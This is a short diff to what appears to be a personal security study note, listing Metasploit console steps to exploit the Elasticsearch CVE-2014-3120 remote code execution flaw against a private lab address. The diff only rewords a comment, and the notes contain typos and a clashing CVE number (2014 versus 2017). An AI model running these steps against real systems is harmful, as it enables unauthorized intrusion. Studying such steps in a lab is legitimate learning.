@@ -25,7 +25,8 @@ Hardware ssecurity
   >tool: msfconsole
   >commands: search elasticsearch
              -> seach CVE-2014-3120
-             -> use exploit/elasticsearch/script_mvel_rce (words at the back of "use" is not a command, you can find it after the command "search CVE-2017-3120")
+             -> use exploit/elasticsearch/script_mvel_rce 
+                (strings after the word "use" is not a command; you can find it after entering the command "search CVE-2017-3120")
              -> show options
              -> set RHOST 10.0.2.4 (attacked ip)
              -> exploit
